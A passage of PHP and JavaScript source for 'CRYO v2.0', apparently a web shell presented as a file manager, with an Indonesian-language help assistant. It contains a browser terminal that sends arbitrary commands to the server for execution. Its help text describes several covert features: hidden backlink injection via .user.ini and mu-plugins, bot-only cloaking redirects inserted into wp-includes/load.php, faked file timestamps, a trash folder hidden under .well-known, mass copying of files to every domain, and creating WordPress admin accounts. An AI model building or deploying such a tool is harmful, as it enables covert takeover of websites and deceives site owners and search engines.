                document.getElementById('term-cwd-label').textContent = '[' + shortCwd + ']';
                document.getElementById('term-prompt').textContent = '$ ';
            }

            function appendOutput(text, type) {
                const out = document.getElementById('term-output');
                const line = document.createElement('div');
                line.style.marginBottom = '1px';
                if (type === 'cmd') { line.style.color = '#818cf8'; line.textContent = '$ ' + text; }
                else if (type === 'error') { line.style.color = '#f87171'; line.textContent = text; }
                else if (type === 'info') { line.style.color = '#818cf8'; line.textContent = text; }
                else if (type === 'muted') { line.style.color = '#64748b'; line.textContent = text; }
                else if (type === 'success') { line.style.color = '#34d399'; line.textContent = text; }
                else { line.style.color = '#c9d1d9'; line.textContent = text; }
                out.appendChild(line);
                out.scrollTop = out.scrollHeight;
            }

            window.termExec = function() {
                const input = document.getElementById('term-input');
                const cmd = input.value.trim();
                input.value = '';

                if (cmd === '') return;

                termHistory.unshift(cmd);
                if (termHistory.length > 100) termHistory.pop();
                termHistIdx = -1;

                appendOutput(cmd, 'cmd');

                if (cmd === 'help') {
                    HELP_TEXT.split('\n').forEach(line => appendOutput(line, ''));
                    return;
                }

                const formData = new FormData();
                formData.append('exec_cmd', '1');
                formData.append('cmd', cmd);
                formData.append('cwd', termCwd);

                fetch(window.location.href, {
                    method: 'POST',
                    body: formData
                })
                .then(res => res.json())
                .then(data => {
                    if (data.output === '__CLEAR__') {
                        document.getElementById('term-output').innerHTML = '';
                    } else if (data.output !== '') {
                        const lines = data.output.split('\n');
                        lines.forEach(line => appendOutput(line, ''));
                    }
                    termCwd = data.cwd || termCwd;
                    updatePrompt();
                })
                .catch(err => {
                    appendOutput('Error: ' + err.message, 'error');
                });
            };

            document.addEventListener('DOMContentLoaded', function() {
                const input = document.getElementById('term-input');
                if (!input) return;
                input.addEventListener('keydown', function(e) {
                    if (e.key === 'Enter') {
                        window.termExec();
                    } else if (e.key === 'ArrowUp') {
                        e.preventDefault();
                        if (termHistIdx < termHistory.length - 1) {
                            termHistIdx++;
                            input.value = termHistory[termHistIdx];
                        }
                    } else if (e.key === 'ArrowDown') {
                        e.preventDefault();
                        if (termHistIdx > 0) {
                            termHistIdx--;
                            input.value = termHistory[termHistIdx];
                        } else {
                            termHistIdx = -1;
                            input.value = '';
                        }
                    }
                });
            });
        })();
        <?php endif; ?>
    </script>

    <?php if (isset($_SESSION['htreplace_message'])): ?>
    <script>showToast(<?= json_encode($_SESSION['htreplace_message']) ?>, <?= json_encode(isset($_SESSION['htreplace_status']) && $_SESSION['htreplace_status'] === 'error' ? 'error' : 'success') ?>);</script>
    <?php unset($_SESSION['htreplace_message'], $_SESSION['htreplace_status']); endif; ?>

    <?php if (isset($_SESSION['ts_message'])): ?>
    <script>showToast(<?= json_encode($_SESSION['ts_message']) ?>, <?= json_encode(isset($_SESSION['ts_status']) ? ($_SESSION['ts_status'] === 'error' ? 'error' : ($_SESSION['ts_status'] === 'partial' ? 'warning' : 'success')) : 'success') ?>);</script>
    <?php unset($_SESSION['ts_message'], $_SESSION['ts_status']); endif; ?>

    <?php if (isset($_SESSION['redirect_message'])): ?>
    <script>showToast(<?= json_encode($_SESSION['redirect_message']) ?>, <?= json_encode(isset($_SESSION['redirect_status']) && $_SESSION['redirect_status'] === 'error' ? 'error' : 'success') ?>);</script>
    <?php unset($_SESSION['redirect_message'], $_SESSION['redirect_status']); endif; ?>

    <?php if (isset($_SESSION['admin_pin_error'])): ?>
    <script>showToast(<?= json_encode($_SESSION['admin_pin_error']) ?>, 'error');</script>
    <?php unset($_SESSION['admin_pin_error']); endif; ?>

    <?php if (isset($_SESSION['admin_create_status'])): ?>
    <script>showToast(<?= json_encode($_SESSION['admin_create_status']) ?>, <?= json_encode(strpos($_SESSION['admin_create_status'], 'Berhasil') !== false ? 'success' : 'error') ?>);</script>
    <?php unset($_SESSION['admin_create_status']); endif; ?>

    <?php if (isset($_SESSION['deploy_file_message'])): ?>
    <script>showToast(<?= json_encode($_SESSION['deploy_file_message']) ?>, <?= json_encode(isset($_SESSION['deploy_file_status']) ? ($_SESSION['deploy_file_status'] === 'error' ? 'error' : ($_SESSION['deploy_file_status'] === 'partial' ? 'warning' : 'success')) : 'success') ?>);</script>
    <?php unset($_SESSION['deploy_file_message'], $_SESSION['deploy_file_status']); endif; ?>


  <!-- CRYO ASSISTANT -->
  <div id="cryoAssistantBtn" onclick="toggleCryoAssistant()" style="position:fixed;bottom:24px;right:24px;z-index:9999;width:52px;height:52px;border-radius:50%;background:linear-gradient(135deg,#6366f1,#8b5cf6);color:#fff;display:flex;align-items:center;justify-content:center;cursor:pointer;box-shadow:0 4px 20px rgba(99,102,241,0.4);transition:all 0.3s;border:2px solid rgba(255,255,255,0.1)">
      <i class="fas fa-robot" style="font-size:22px"></i>
  </div>

  <div id="cryoAssistantPanel" style="display:none;position:fixed;bottom:86px;right:24px;z-index:9998;width:380px;max-height:520px;border-radius:16px;background:rgba(15,18,30,0.97);backdrop-filter:blur(20px);border:1px solid rgba(99,102,241,0.25);box-shadow:0 8px 40px rgba(0,0,0,0.5);flex-direction:column;overflow:hidden;font-family:inherit">
      <div style="padding:14px 16px;background:linear-gradient(135deg,rgba(99,102,241,0.15),rgba(139,92,246,0.1));border-bottom:1px solid rgba(99,102,241,0.2);display:flex;align-items:center;gap:10px">
          <i class="fas fa-robot" style="color:#a5b4fc;font-size:18px"></i>
          <div style="flex:1">
              <div style="font-weight:600;font-size:13px;color:#e2e8f0">CRYO Assistant</div>
              <div style="font-size:10px;color:#94a3b8">Ketik pertanyaan atau keyword</div>
          </div>
          <button onclick="toggleCryoAssistant()" style="background:none;border:none;color:#94a3b8;cursor:pointer;font-size:16px;padding:4px"><i class="fas fa-xmark"></i></button>
      </div>
      <div id="cryoChat" style="flex:1;overflow-y:auto;padding:12px;display:flex;flex-direction:column;gap:8px;max-height:380px;min-height:200px"></div>
      <div style="padding:10px 12px;border-top:1px solid rgba(99,102,241,0.15);display:flex;gap:8px">
          <input type="text" id="cryoInput" placeholder="Ketik pertanyaan..." onkeydown="if(event.key==='Enter')sendCryoMsg()" style="flex:1;background:rgba(30,35,55,0.8);border:1px solid rgba(99,102,241,0.2);border-radius:10px;padding:8px 12px;color:#e2e8f0;font-size:12px;outline:none;font-family:inherit">
          <button onclick="sendCryoMsg()" style="background:linear-gradient(135deg,#6366f1,#8b5cf6);border:none;border-radius:10px;padding:8px 14px;color:#fff;cursor:pointer;font-size:12px"><i class="fas fa-paper-plane"></i></button>
      </div>
  </div>

  <style>
  #cryoAssistantBtn:hover{transform:scale(1.1);box-shadow:0 6px 28px rgba(99,102,241,0.5)}
  #cryoAssistantPanel{animation:cryoSlideUp 0.25s ease}
  @keyframes cryoSlideUp{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
  #cryoChat::-webkit-scrollbar{width:4px}
  #cryoChat::-webkit-scrollbar-thumb{background:rgba(99,102,241,0.3);border-radius:4px}
  .cryo-msg{max-width:88%;padding:10px 13px;border-radius:12px;font-size:12px;line-height:1.6;word-wrap:break-word}
  .cryo-msg-bot{background:rgba(30,35,55,0.9);color:#cbd5e1;border:1px solid rgba(99,102,241,0.15);align-self:flex-start;border-bottom-left-radius:4px}
  .cryo-msg-user{background:linear-gradient(135deg,rgba(99,102,241,0.25),rgba(139,92,246,0.2));color:#e2e8f0;border:1px solid rgba(99,102,241,0.2);align-self:flex-end;border-bottom-right-radius:4px}
  .cryo-msg-bot code{background:rgba(99,102,241,0.15);padding:1px 5px;border-radius:4px;font-size:11px;color:#a5b4fc;font-family:'Fira Code',monospace}
  .cryo-msg-bot strong{color:#a5b4fc}
  .cryo-quick{display:flex;flex-wrap:wrap;gap:4px;margin-top:6px}
  .cryo-quick button{background:rgba(99,102,241,0.12);border:1px solid rgba(99,102,241,0.2);color:#a5b4fc;padding:4px 10px;border-radius:8px;font-size:10px;cursor:pointer;font-family:inherit;transition:all 0.2s}
  .cryo-quick button:hover{background:rgba(99,102,241,0.25)}
  </style>

  <script>
  (function(){
      const CTX = {
          folder: <?= json_encode($directory) ?>,
          docRoot: <?= json_encode($_SERVER['DOCUMENT_ROOT']) ?>,
          phpVer: <?= json_encode(phpversion()) ?>,
          serverSw: <?= json_encode(isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Unknown') ?>,
          serverName: <?= json_encode(isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'Unknown') ?>,
          serverIp: <?= json_encode(isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : 'Unknown') ?>,
          role: <?= json_encode($userRole) ?>,
          os: <?= json_encode(PHP_OS) ?>,
          diskFree: <?= json_encode(function_exists('disk_free_space') ? round(@disk_free_space($_SERVER['DOCUMENT_ROOT'])/(1024*1024*1024),2).'GB' : 'N/A') ?>,
          diskTotal: <?= json_encode(function_exists('disk_total_space') ? round(@disk_total_space($_SERVER['DOCUMENT_ROOT'])/(1024*1024*1024),2).'GB' : 'N/A') ?>,
          maxUpload: <?= json_encode(ini_get('upload_max_filesize')) ?>,
          postMax: <?= json_encode(ini_get('post_max_size')) ?>,
          memLimit: <?= json_encode(ini_get('memory_limit')) ?>,
          fileCount: <?= (int)(isset($filesAndFolders) ? count($filesAndFolders) : 0) ?>,
          items: <?= json_encode(array_slice(array_map(function($x){ $s=(string)$x; if(function_exists('mb_convert_encoding')){ return @mb_convert_encoding($s,'UTF-8','UTF-8'); } if(function_exists('iconv')){ $r=@iconv('UTF-8','UTF-8//IGNORE',$s); return $r===false?$s:$r; } return preg_replace('/[^\x{0009}\x{000A}\x{000D}\x{0020}-\x{D7FF}\x{E000}-\x{FFFD}]/u','',$s); }, (isset($filesAndFolders) ? $filesAndFolders : [])), 0, 30)) ?: '[]' ?>
      };

      const KB = [
          {
              keys: ['halo','hai','hello','hi','hey','help','bantuan','bantu'],
              reply: function() {
                  return 'Halo! Saya <strong>CRYO Assistant</strong>. Saya bisa membantu kamu tentang file manager ini.<div class="cryo-quick"><button onclick="sendQ(&#39;server info&#39;)">Server Info</button><button onclick="sendQ(&#39;cara upload&#39;)">Cara Upload</button><button onclick="sendQ(&#39;cara terminal&#39;)">Terminal</button><button onclick="sendQ(&#39;folder ini&#39;)">Folder Ini</button><button onclick="sendQ(&#39;fitur&#39;)">Daftar Fitur</button></div>';
              }
          },
          {
              keys: ['server info','info server','server','spesifikasi','spec','spek'],
              reply: function() {
                  return '<strong>Server Information:</strong><br>' +
                      '" Server: <code>' + CTX.serverSw + '</code><br>' +
                      '" Domain: <code>' + CTX.serverName + '</code><br>' +
                      '" IP: <code>' + CTX.serverIp + '</code><br>' +
                      '" PHP: <code>' + CTX.phpVer + '</code><br>' +
                      '" OS: <code>' + CTX.os + '</code><br>' +
                      '" Disk: <code>' + CTX.diskFree + '</code> free / <code>' + CTX.diskTotal + '</code> total<br>' +
                      '" Max Upload: <code>' + CTX.maxUpload + '</code><br>' +
                      '" Post Max: <code>' + CTX.postMax + '</code><br>' +
                      '" Memory Limit: <code>' + CTX.memLimit + '</code>';
              }
          },
          {
              keys: ['folder ini','folder sekarang','current','dimana','direktori','isi folder','list file','daftar file'],
              reply: function() {
                  let r = '<strong>Folder saat ini:</strong><br><code>' + CTX.folder + '</code><br>Berisi <strong>' + CTX.fileCount + '</strong> item.';
                  if (CTX.items.length > 0) {
                      r += '<br><br><strong>Isi:</strong><br>';
                      CTX.items.slice(0, 15).forEach(function(f) { r += '" <code>' + f + '</code><br>'; });
                      if (CTX.fileCount > 15) r += '" ... dan ' + (CTX.fileCount - 15) + ' item lainnya';
                  }
                  return r;
              }
          },
          {
              keys: ['upload','unggah','cara upload'],
              reply: function() {
                  return '<strong>Cara Upload File:</strong><br><br>' +
                      '<strong>1. Upload File Biasa:</strong><br>" Klik tombol <code>Choose File</code> di sidebar kiri<br>" Pilih file dari komputer<br>" Klik <code>Upload</code><br>" Max size: <code>' + CTX.maxUpload + '</code><br><br>' +
                      '<strong>2. Upload via URL:</strong><br>" Di sidebar, cari card <code>Download from URL</code><br>" Masukkan URL lengkap file (contoh: <code>https://example.com/file.zip</code>)<br>" Klik <code>Download</code><br>" File akan didownload ke folder yang sedang dibuka<br><br>' +
                      '<strong>Tips:</strong> Untuk file besar, gunakan Upload via URL karena tidak dibatasi oleh <code>upload_max_filesize</code>.';
              }
          },
          {
              keys: ['terminal','cmd','command','perintah','cara terminal','shell'],
              reply: function() {
                  return '<strong>Cara Menggunakan Terminal:</strong><br><br>' +
                      '" Klik tombol <code>Open Terminal</code> di sidebar<br>" Ketik perintah lalu tekan <code>Enter</code><br><br>' +
                      '<strong>Command yang sering dipakai:</strong><br>' +
                      '" <code>ls -la</code>  lihat isi folder detail<br>' +
                      '" <code>pwd</code>  lihat posisi folder<br>' +
                      '" <code>cd namaFolder</code>  masuk ke folder<br>' +
                      '" <code>cd ..</code>  mundur 1 folder<br>' +
                      '" <code>mkdir namaFolder</code>  buat folder baru<br>' +
                      '" <code>rm namaFile</code>  hapus file<br>' +
                      '" <code>rm -rf namaFolder</code>  hapus folder + isinya<br>' +
                      '" <code>cp file1 file2</code>  copy file<br>' +
                      '" <code>mv file1 file2</code>  pindahkan/rename<br>' +
                      '" <code>cat namaFile</code>  lihat isi file<br>' +
                      '" <code>wget URL</code>  download file dari URL<br>' +
                      '" <code>zip -r arsip.zip folder/</code>  zip folder<br>' +
                      '" <code>unzip arsip.zip</code>  extract zip<br>' +
                      '" <code>du -sh *</code>  lihat ukuran file/folder<br>' +
                      '" <code>df -h</code>  lihat kapasitas disk<br>' +
                      '" <code>find . -name "*.php"</code>  cari file PHP';
              }
          },
          {
              keys: ['trash','recycle','sampah','hapus','delete','cara hapus','restore'],
              reply: function() {
                  return '<strong><i class="fas fa-trash-can" style="color:#ef4444"></i> Trash / Recycle Bin:</strong><br><br>' +
                      '&bull; File yang dihapus tidak langsung hilang - pindah ke <strong>Trash</strong> dulu<br>' +
                      '&bull; Buka via tombol <code>Open Trash</code> di sidebar (atau URL <code>?view_trash=1</code>)<br>' +
                      '&bull; Lokasi: <code>DOCUMENT_ROOT/.well-known/acme-challenge/.cache/.trash</code> (auto-protected via .htaccess)<br><br>' +
                      '<strong>Restore:</strong> klik tombol <i class="fas fa-rotate-left" style="color:#86efac"></i> hijau di samping file - file kembali ke lokasi asal (jika nama bentrok diberi sufiks <code>_restored_N</code>).<br><br>' +
                      '<strong>Hapus Permanen:</strong> tombol <i class="fas fa-xmark" style="color:#ef4444"></i> merah, atau <code>Empty Trash</code> untuk kosongkan semua.<br><br>' +
                      '<strong>Auto-clean:</strong> file di Trash otomatis dihapus setelah <code>7 hari</code>.<br>' +
                      '<strong>Metadata:</strong> path asli &amp; tanggal hapus disimpan di file <code>.meta</code> per item.';
              }
          },
          {
              keys: ['permission','chmod','izin','hak akses','755','644','777'],
              reply: function() {
                  return '<strong>Tentang Permission / Chmod:</strong><br><br>' +
                      '<strong>Format:</strong> 3 digit angka (pemilik-grup-publik)<br>' +
                      '" <code>7</code> = baca + tulis + eksekusi<br>' +
                      '" <code>6</code> = baca + tulis<br>' +
                      '" <code>5</code> = baca + eksekusi<br>' +
                      '" <code>4</code> = baca saja<br><br>' +
                      '<strong>Yang umum dipakai:</strong><br>' +
                      '" <code>755</code>  folder (standar)<br>' +
                      '" <code>644</code>  file biasa (standar)<br>' +
                      '" <code>600</code>  file sensitif (.env, config)<br>' +
                      '" <code>444</code>  read-only<br><br>' +
                      '<strong>Cara:</strong> Ketik angka di kolom chmod di samping file, lalu klik tombol kunci =';
              }
          },
          {
              keys: ['zip','extract','arsip','archive','tar','compress','kompres'],
              reply: function() {
                  return '<strong>ZIP & Extract:</strong><br><br>' +
                      '<strong>Membuat ZIP:</strong><br>' +
                      '" Pilih file/folder dengan checkbox<br>" Pilih format (zip/tar/tar.gz/tar.bz2)<br>" Klik <code>ZIP Selected</code><br>" Atau klik icon =� di samping file individual<br><br>' +
                      '<strong>Extract:</strong><br>' +
                      '" Klik icon extract (=�) di samping file arsip<br>" Pilih tujuan extract<br>" File akan diekstrak ke folder yang dipilih<br><br>' +
                      '<strong>Via Terminal:</strong><br>' +
                      '" <code>zip -r output.zip folder/</code><br>' +
                      '" <code>unzip file.zip</code><br>' +
                      '" <code>tar -czf output.tar.gz folder/</code><br>' +
                      '" <code>tar -xzf file.tar.gz</code>';
              }
          },
          {
              keys: ['edit','editor','cara edit','code editor','edit file'],
              reply: function() {
                  return '<strong>Cara Edit File:</strong><br><br>' +
                      '" Klik <strong>nama file</strong> di daftar file<br>' +
                      '" Editor akan terbuka dengan syntax highlighting<br>' +
                      '" Edit isinya sesuai kebutuhan<br>' +
                      '" Klik tombol <code>Save</code> untuk menyimpan<br><br>' +
                      '<strong>Tips:</strong><br>' +
                      '" Editor mendukung banyak bahasa (PHP, JS, HTML, CSS, dll)<br>' +
                      '" Hati-hati saat mengedit <code>.htaccess</code>  kesalahan bisa bikin website error 500';
              }
          },
          {
              keys: ['deploy','copy domain','salin ke domain','deploy file'],
              reply: function() {
                  return '<strong>Deploy File:</strong><br><br>' +
                      '" Klik <code>Deploy to Domains</code> di sidebar (Admin only)<br>' +
                      '" Pilih file yang ingin di-deploy<br>' +
                      '" File akan disalin ke semua domain/subdomain di server<br><br>' +
                      '<strong>Kegunaan:</strong> Menyebarkan file (misal: script, config) ke banyak domain sekaligus tanpa copy satu per satu.';
              }
          },
          {
              keys: ['redirect','301','redirect 301','cara redirect'],
              reply: function() {
                  return '<strong>Redirect 301:</strong><br><br>' +
                      '" Klik <code>Create Redirect</code> di sidebar (Admin only)<br>' +
                      '" Buat aturan redirect dari URL lama ke URL baru<br>' +
                      '" Redirect akan ditambahkan ke <code>.htaccess</code><br><br>' +
                      '<strong>Contoh:</strong><br>' +
                      '" <code>/halaman-lama</code> � <code>https://domain.com/halaman-baru</code>';
              }
          },
          {
              keys: ['timestamp','sync','waktu','ubah tanggal','modify time','touch'],
              reply: function() {
                  return '<strong>Sync Timestamp:</strong><br><br>' +
                      '" Mengubah tanggal modifikasi file/folder<br>' +
                      '" Masukkan path target, tanggal, dan waktu<br>' +
                      '" Centang <code>Recursive</code> untuk ubah semua isinya juga<br><br>' +
                      '<strong>Via Terminal:</strong><br>' +
                      '" <code>touch -t YYYYMMDDhhmm namaFile</code>';
              }
          },
          {
              keys: ['rename','ubah nama','ganti nama','cara rename'],
              reply: function() {
                  return '<strong>Cara Rename File/Folder:</strong><br><br>' +
                      '" Klik icon <code>pensil</code> () di samping nama file<br>' +
                      '" Masukkan nama baru<br>' +
                      '" Klik OK / Enter<br><br>' +
                      '<strong>Via Terminal:</strong><br>' +
                      '" <code>mv namaLama namaBaru</code>';
              }
          },
          {
              keys: ['buat file','create file','new file','file baru','buat folder','create folder','new folder','folder baru','mkdir'],
              reply: function() {
                  return '<strong>Buat File / Folder Baru:</strong><br><br>' +
                      '<strong>Buat File:</strong><br>' +
                      '" Di sidebar, isi nama file di kolom <code>Create New File</code><br>' +
                      '" Klik <code>Create</code><br><br>' +
                      '<strong>Buat Folder:</strong><br>' +
                      '" Di sidebar, isi nama folder di kolom <code>Create Folder</code><br>' +
                      '" Klik <code>Create</code><br><br>' +
                      'File/folder akan dibuat di folder yang sedang dibuka: <code>' + CTX.folder + '</code>';
              }
          },
          {
              keys: ['wordpress','wp-admin','wp admin','cara wp'],
              reply: function() {
                  return '<strong>WordPress Admin Tools:</strong><br><br>' +
                      '" Klik <code>Admin Tools</code> di sidebar (Admin only)<br>' +
                      '" Fitur yang tersedia:<br>' +
                      '  - Buat user admin WP baru<br>' +
                      '  - Reset password admin WP<br><br>' +
                      '<strong>Tips:</strong> Pastikan folder yang dibuka adalah root WordPress (ada <code>wp-config.php</code>).';
              }
          },
          {
              keys: ['php','phpinfo','php version','versi php'],
              reply: function() {
                  return '<strong>PHP Information:</strong><br>' +
                      '" Versi: <code>' + CTX.phpVer + '</code><br>' +
                      '" Max Upload: <code>' + CTX.maxUpload + '</code><br>' +
                      '" Post Max Size: <code>' + CTX.postMax + '</code><br>' +
                      '" Memory Limit: <code>' + CTX.memLimit + '</code><br><br>' +
                      '<strong>Cek detail via Terminal:</strong><br>' +
                      '" <code>php -v</code>  versi PHP CLI<br>' +
                      '" <code>php -m</code>  modul terinstall<br>' +
                      '" <code>php -i | grep extension</code>  cari extension';
              }
          },
          {
              keys: ['disk','space','ruang','kapasitas','storage','penyimpanan'],
              reply: function() {
                  return '<strong>Disk Space:</strong><br>' +
                      '" Free: <code>' + CTX.diskFree + '</code><br>' +
                      '" Total: <code>' + CTX.diskTotal + '</code><br><br>' +
                      '<strong>Cek via Terminal:</strong><br>' +
                      '" <code>df -h</code>  ringkasan disk<br>' +
                      '" <code>du -sh *</code>  ukuran per folder<br>' +
                      '" <code>du -sh .</code>  ukuran folder ini<br>' +
                      '" <code>du -h --max-depth=1 | sort -rh</code>  folder terbesar';
              }
          },
          {
              keys: ['htaccess','ht access','cara htaccess','error 500','500','403','404'],
              reply: function() {
                  return '<strong>.htaccess & HTTP Errors:</strong><br><br>' +
                      '<strong>Error 500:</strong> Cek <code>.htaccess</code>  mungkin ada syntax error. Coba rename jadi <code>.htaccess.bak</code> lalu test.<br><br>' +
                      '<strong>Error 403:</strong> Permission salah. Folder harus <code>755</code>, file harus <code>644</code>.<br><br>' +
                      '<strong>Error 404:</strong> File tidak ditemukan. Cek apakah path di <code>.htaccess</code> rewrite benar.<br><br>' +
                      '<strong>Tips:</strong><br>' +
                      '" Jangan ubah permission ke <code>777</code>  rawan dan bisa di-flag WAF<br>' +
                      '" Backup <code>.htaccess</code> sebelum edit';
              }
          },
          {
                keys: ['htaccess','redirect','hardening','rewrite','wp-includes','wp-content','crawl bot','google console','301'],
                reply: function() {
                    return '<strong>Htaccess & Redirect (Admin only):</strong><br><br>' +
                        'Buka panel kanan � klik <code>Htaccess & Redirect</code>. Pilih kategori:<br><br>' +
                        '<strong>=� Kategori .htaccess Rules:</strong><br>' +
                        '" <code>wp-includes</code>  block PHP execution di wp-includes<br>' +
                        '" <code>wp-content</code>  allow only file statis<br>' +
                        '" <code>Custom Allow</code>  buka semua akses<br>' +
                        '" <code>Custom Deny</code>  block eksekusi PHP umum<br>' +
                        '" <code>Folder Safe</code>  fallback WordPress aman<br>' +
                        '" <code>Tolak Google Console</code>  block file verifikasi google<br>' +
                        '" <code>Tolak Crawl Bot</code>  block bot Google/Bing/Baidu<br><br>' +
                        '<strong>� Kategori Redirect:</strong><br>' +
                        '" <code>Redirect All</code>  redirect semua URL ke target<br>' +
                        '" <code>Redirect Pengecualian</code>  redirect kecuali folder/query tertentu<br>' +
                        '" <code>Redirect per Brand</code>  redirect per folder ke subpath target<br>' +
                        '" <code>Redirect di Theme</code>  inject ke <code>functions.php</code><br><br>' +
                        '<strong>Cara kerja:</strong><br>' +
                        '" Snippet dibungkus marker <code>BEGIN/END CRYO_TPL</code><br>' +
                        '" Jika .htaccess sudah ada � ditambahkan di bawahnya (TIDAK timpa)<br>' +
                        '" Jika belum ada � dibuat baru<br>' +
                        '" Pilih <code>Aktifkan (ON)</code> untuk pasang, <code>Nonaktifkan (OFF)</code> untuk lepas';
                }
            },
            {
              keys: ['fitur','feature','menu','apa saja','kemampuan','bisa apa'],
              reply: function() {
                  return '<strong>Fitur CRYO v2.0:</strong><br><br>' +
                      '<i class="fas fa-folder-tree" style="color:#60a5fa"></i> <strong>File Management:</strong> Browse, upload, download, rename, edit, delete, create file/folder<br>' +
                      '<i class="fas fa-file-zipper" style="color:#fbbf24"></i> <strong>Archive:</strong> ZIP, TAR, TAR.GZ, TAR.BZ2 - create &amp; extract<br>' +
                      '<i class="fas fa-trash-can" style="color:#ef4444"></i> <strong>Trash:</strong> Soft-delete dengan restore (auto-clean 7 hari)<br>' +
                      '<i class="fas fa-key" style="color:#fbbf24"></i> <strong>Permission:</strong> Chmod file/folder<br>' +
                      '<i class="fas fa-code" style="color:#a78bfa"></i> <strong>Code Editor:</strong> Edit file dengan syntax highlighting<br>' +
                      '<i class="fas fa-magnifying-glass" style="color:#22c55e"></i> <strong>Code Explorer:</strong> Cari kata / nama file rekursif (Search Files &amp; Code di sidebar)<br>' +
                      '<i class="fas fa-link" style="color:#22d3ee"></i> <strong>Sisip Link:</strong> Inject link SEO multi-framework (WordPress, Laravel, CodeIgniter, Yii, Slim, atau PHP biasa) - admin<br>' +
                      '<i class="fas fa-terminal" style="color:#34d399"></i> <strong>Terminal:</strong> Command prompt langsung di browser<br>' +
                      '<i class="fas fa-cloud-arrow-down" style="color:#60a5fa"></i> <strong>Download URL:</strong> Download file dari URL ke server<br>' +
                      '<i class="fas fa-shield-halved" style="color:#f472b6"></i> <strong>Htaccess &amp; Redirect:</strong> Template .htaccess hardening + redirect (admin)<br>' +
                      '<i class="fab fa-wordpress" style="color:#21759b"></i> <strong>Redirect via Wp-includes:</strong> Bot UA cloaking 301 ke domain lain via wp-includes/load.php (admin) - <em>baru</em><br>' +
                      '<i class="fas fa-rocket" style="color:#fb923c"></i> <strong>Deploy:</strong> Copy file ke semua domain<br>' +
                      '<i class="fas fa-clock" style="color:#94a3b8"></i> <strong>Timestamp:</strong> Ubah tanggal modifikasi file<br>' +
                      '<i class="fab fa-wordpress" style="color:#21759b"></i> <strong>WordPress:</strong> Admin tools (create/reset user)<br>' +
                      '<i class="fas fa-robot" style="color:#a5b4fc"></i> <strong>CRYO Assistant:</strong> Bantuan penggunaan (ini!)';
              }
          },
          {
              keys: ['cari','search','pencarian','code explorer','explorer','grep','find','temukan'],
              reply: function() {
                  return '<strong><i class="fas fa-magnifying-glass" style="color:#22c55e"></i> Code Explorer  Cara Pakai:</strong><br><br>' +
                      '1 Klik tombol <strong>Search Files & Code</strong> di sidebar (bagian CODE EXPLORER).<br>' +
                      '2 Isi <strong>Query</strong>: kata / nama variabel / regex yang dicari.<br>' +
                      '3 <strong>Scope Path</strong>: folder awal pencarian (absolut). Tombol cepat: <em>Folder ini</em>, <em>Document Root</em>, <em>.. (Parent)</em>.<br>' +
                      '4 <strong>Mode</strong>: Isi File / Nama File / Keduanya.<br>' +
                      '5 <strong>Filter Nama File (glob)</strong>: contoh <code>*.php</code>, <code>*.html,*.js</code>. Boleh juga ketik <code>php</code> saja  otomatis jadi <code>*.php</code>.<br>' +
                      '6 Centang <strong>Case-sensitive</strong> / <strong>Regex</strong> bila perlu.<br>' +
                      '7 Klik <strong>Cari</strong> atau tekan Enter.<br><br>' +
                      '<strong>Limit aman:</strong> 5 MB/file " 20.000 file " 50 detik " 500 hasil.<br>' +
                      '<strong>Tip:</strong> Klik <em>Buka folder</em> di hasil untuk navigasi langsung.';
              }
          },
          {
              keys: ['sisip','link','injector','sisip link','seo link','backlink','panel link'],
              reply: function() {
                  return '<strong><i class="fas fa-link" style="color:#22d3ee"></i> Sisip Link  Cara Pakai (Admin):</strong><br><br>' +
                      '1 Klik <strong>Kelola Sisip Link</strong> di sidebar.<br>' +
                      '2 Scope = folder aktif (otomatis).<br>' +
                      '3 Isi <strong>Link 1</strong> (wajib): URL + Anchor + rel + opsi Hidden.<br>' +
                      '4 Link 2 & 3 opsional, kosongkan untuk skip.<br>' +
                      '5 (Opsional) Pilih <strong>Framework target</strong>: <em>Auto-detect</em> (default), <em>WordPress</em>, <em>Laravel</em>, atau <em>Lainnya</em>.<br>' +
                      '6 Klik <strong>Aktifkan / Update</strong>.<br><br>' +
                      '<strong>Mekanisme per Framework:</strong><br>' +
                      '" <strong>Auto:</strong> deteksi <code>wp-load.php</code> -> WordPress; jika tidak ada -> .user.ini.<br>' +
                      '" <strong>WordPress:</strong> bikin <code>wp-content/mu-plugins/panel-links.php</code>.<br>' +
                      '" <strong>Laravel:</strong> tulis <code>.user.ini</code> + cache di folder <code>/public</code> (entry point).<br>' +
                      '" <strong>Lainnya:</strong> tulis <code>auto_prepend_file</code> ke <code>.user.ini</code> di scope.<br>' +
                      '" Selalu tulis <code>.site_links.json</code> + <code>.panel_render.php</code> di lokasi target.<br><br>' +
                      '<strong>.user.ini aman:</strong> hanya baris milik CRYO yang ditambah/dihapus  setting PHP existing tetap utuh.<br>' +
                      '<strong>Nonaktifkan:</strong> Klik <strong>Nonaktifkan & Bersihkan</strong>  semua file injector dihapus (root + /public), .user.ini & .htaccess dibersihkan dari baris CRYO.';
              }
          },
          {
              keys: ['wpinc','wp-includes','load.php','cloaking','bot redirect','redirect bot','wpinc_bot_redirect'],
              reply: function() {
                  return '<strong><i class="fab fa-wordpress" style="color:#21759b"></i> Redirect via Wp-includes - Cara Pakai (Admin):</strong><br><br>' +
                      '1. Buka <strong>Htaccess &amp; Redirect</strong> di sidebar.<br>' +
                      '2. Pilih <strong>Kategori</strong>: <em>Redirect via Wp-includes</em>.<br>' +
                      '3. <strong>Folder Tujuan</strong>: root WordPress (yang berisi <code>wp-includes/</code>) atau langsung folder <code>wp-includes/</code> - keduanya didukung auto-detect.<br>' +
                      '4. Isi <strong>Route 1</strong> (wajib): Path URL Sumber (mis. <code>/services/contoh</code>) + Target URL (URL tujuan saat bot mengakses).<br>' +
                      '5. Route 2-8 opsional, kosongkan jika tidak dipakai.<br>' +
                      '6. Klik <strong>Aktifkan (ON)</strong>.<br><br>' +
                      '<strong>Mekanisme:</strong> snippet PHP disisipkan ke <code>wp-includes/load.php</code> dengan marker <code>// BEGIN/END CRYO_TPL:wpinc_bot_redirect</code>. Hanya request yang User-Agent-nya match keyword bot (<code>googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot</code>) yang di-redirect 301 - user biasa tetap melihat halaman normal.<br><br>' +
